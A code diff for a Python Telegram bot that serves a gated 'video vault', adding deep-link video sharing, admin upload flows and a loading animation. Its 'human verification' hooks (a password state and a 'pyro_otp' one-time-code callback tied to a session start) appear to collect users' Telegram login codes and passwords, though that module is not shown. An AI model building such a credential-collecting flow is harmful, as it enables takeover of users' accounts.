         "⏳ <b>Loading your video vault</b>\n\n▰▰▱▱▱ Checking access…",
@@ -871,10 +1446,10 @@ async def _animate_start_loading(status_message):
         "⏳ <b>Loading your video vault</b>\n\n▰▰▰▰▱ Checking access…",
         "⏳ <b>Loading your video vault</b>\n\n▰▰▰▰▰ Almost ready…",
     )
-    index = 1
+    index = 1  # The first frame is sent directly, before database work.
     try:
         while True:
-            await asyncio.sleep(1.6)
+            await asyncio.sleep(1.6)  # Limit status edits to avoid Telegram flood limits.
             try:
                 await status_message.edit_text(frames[index], parse_mode=ParseMode.HTML)
             except RetryAfter as exc:
@@ -891,6 +1466,12 @@ async def _animate_start_loading(status_message):
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if context.args:
+        m = re.fullmatch(r"vl_([0-9a-fA-F]{16})", context.args[0])
+        if m:
+            return await start_video_link(update, context, m.group(1).lower())
+
+    # A visible loading bar is sent immediately; only one message is ever edited.
     status = await reply(
         update, context,
         "⏳ <b>Loading your video vault</b>\n\n▰▱▱▱▱ Checking access…",
@@ -901,6 +1482,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         uid = update.effective_user.id
         _, missing, _ = await membership_result(context.bot, uid)
         await asyncio.to_thread(_start_db_decision, uid, not missing)
+        # Stop edits before replacing the animation with the actual user menu.
         animation.cancel()
         await asyncio.gather(animation, return_exceptions=True)
         if missing:
@@ -1037,6 +1619,7 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
 
 
+
 async def noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer("Verification is running…")
 
@@ -1094,8 +1677,14 @@ async def send_batch(bot, chat_id, batch_no):
     delete_at = utcnow() + timedelta(hours=delete_hours)
     if sent:
         pending_deletions.insert_many(
-            [{"chat_id": chat_id, "message_id": mid, "delete_at": delete_at, "kind": "video"}
-             for mid in sent]
+            [{
+                "chat_id": chat_id,
+                "message_id": mid,
+                "delete_at": delete_at,
+                "kind": "video",
+                "attempts": 0,
+                "created_at": utcnow(),
+            } for mid in sent]
         )
 
     await bot.send_message(
@@ -1119,6 +1708,7 @@ async def my_videos(update, context):
 
 
 async def see_videos_from_hv(update, context):
+    """Called from '📚 See Videos' button after human verification."""
     if not await ensure_verified(update, context):
         return
     uid = update.effective_user.id
@@ -1531,6 +2121,10 @@ def _enqueue_upload(bot, runtime, chat_id, source_id):
 
 
 async def admin_collect_video(update, context):
+    if update.effective_user.id == ADMIN_ID and ADMIN_STATE.get(ADMIN_ID) == "video_link_upload":
+        handled = await admin_collect_link_video(update, context)
+        if handled:
+            return
     if update.effective_user.id != ADMIN_ID or ADMIN_STATE.get(ADMIN_ID) != "upload_videos":
         return
     if not update.message.video:
@@ -1966,8 +2560,17 @@ async def cancel(update, context):
         if running:
             await asyncio.gather(*running, return_exceptions=True)
         await _stop_upload_progress(runtime, context.bot, "❌ <b>Upload cancelled</b>")
+    link_runtime = LINK_UPLOAD_RUNTIME.pop(ADMIN_ID, None)
+    if link_runtime:
+        link_runtime["closing"] = True
+        link_tasks = list(link_runtime.get("tasks", set()))
+        for task in link_tasks:
+            task.cancel()
+        if link_tasks:
+            await asyncio.gather(*link_tasks, return_exceptions=True)
     ADMIN_STATE.pop(ADMIN_ID, None)
     drafts.delete_one({"admin_id": ADMIN_ID})
+    video_link_drafts.delete_one({"admin_id": ADMIN_ID})
     context.user_data.pop("custom_link_chat_id", None)
     await reply(update, context, "Cancelled.", reply_markup=admin_menu_inline())
 
@@ -1991,7 +2594,9 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer()
         return await progress(update, context)
     if data == "um_verify_robot":
-        # Unlimited verification — user can verify as many times as they want.
+        d = user_doc(uid) or {}
+        if d.get("human_verified"):
+            return await q.answer("✅ You are already verified.", show_alert=True)
         await q.answer()
         return await HV.session_start(update, context)
     if data == "um_see_videos":
@@ -2005,6 +2610,9 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "am_broadcast":
         await q.answer()
         return await BROADCAST.menu(update, context)
+    if data == "am_videolinks":
+        await q.answer()
+        return await admin_video_links_menu(update, context)
     if data == "am_upload":
         await q.answer()
         return await admin_upload_start(update, context)
@@ -2067,6 +2675,8 @@ async def text_router(update: Update, context):
     if uid == ADMIN_ID and await set_text_input(update, context):
         return
 
+    # Direct /link flow accepts uploaded videos, not batch-position text.
+
     # ── HV password / wrong-stage handling ──
     if HV.states.get(uid) == "password":
         return await HV.password_handler(update, context)
@@ -2106,6 +2716,8 @@ def main():
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("set", set_command))
     app.add_handler(CommandHandler("uploadstatus", admin_upload_status))
+    app.add_handler(CommandHandler("link", link_command))
+    app.add_handler(CommandHandler("done", done_link_command))
     app.add_handler(CommandHandler("setcustomlink", set_custom_link))
     app.add_handler(CommandHandler("resetverify", admin_reset_verify))
 
@@ -2119,7 +2731,7 @@ def main():
 
     app.add_handler(CallbackQueryHandler(
         menu_callback,
-        pattern=r"^(um_(videos|unlock|ref|progress|verify_robot|see_videos)|am_(upload|batches|addgroup|groups|remove|stats|set|help|broadcast)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
+        pattern=r"^(um_(videos|unlock|ref|progress|verify_robot|see_videos)|am_(upload|batches|addgroup|groups|remove|stats|set|help|broadcast|videolinks)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
     ))
     app.add_handler(CallbackQueryHandler(set_edit_callback, pattern=r"^set_edit:"))
     app.add_handler(CallbackQueryHandler(set_cancel_callback, pattern=r"^set_cancel$"))
@@ -2128,6 +2740,8 @@ def main():
     app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
     app.add_handler(CallbackQueryHandler(HV.otp_callback, pattern=r"^pyro_otp\|"))
     app.add_handler(CallbackQueryHandler(BROADCAST.callback, pattern=r"^bc_"))
+    app.add_handler(CallbackQueryHandler(video_link_admin_callback, pattern=r"^vla_"))
+    app.add_handler(CallbackQueryHandler(verify_video_link, pattern=r"^vl_verify:"))
 
     # Broadcast drafts are handled before ordinary admin video/text handlers.
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND,
